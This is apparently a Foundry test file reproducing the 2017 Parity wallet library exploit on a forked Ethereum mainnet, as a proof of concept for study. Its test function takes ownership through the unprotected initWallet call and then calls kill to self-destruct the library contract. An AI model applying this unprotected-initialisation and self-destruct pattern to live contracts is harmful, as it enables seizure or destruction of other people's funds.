// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface parity {
    function isOwner(
        address _addr
    ) external view returns (bool);

    function kill(
        address _to
    ) external;

    function initWallet(address[] memory _owners, uint256 _required, uint256 _daylimit) external;
}

contract ContractTest is Test {
    parity WalletLibrary = parity(payable(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4));
    // Real Parity addresses
    // 0xbec591de75b8699a3ba52f073428822d0bfc0d7e
    // 0x50126e8fcb9be29f83c6bbd913cc85b40eaf86fc
    // 0x91efffb9c6cd3a66474688d0a48aa6ecfe515aa5

    address[] public owner;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 4_501_735); //fork mainnet at block 4501735
    }

    function testExploit() public {
        WalletLibrary.isOwner(address(this)); // not a owner of contract
        owner.push(address(this));
        WalletLibrary.initWallet(owner, 0, 0);
        bool isowner = WalletLibrary.isOwner(address(this)); // you are owner of contract now
        assertTrue(isowner);
        WalletLibrary.kill(address(this));
        WalletLibrary.isOwner(address(this)); // contract destroyed, return 0
    }

    receive() external payable {}
}
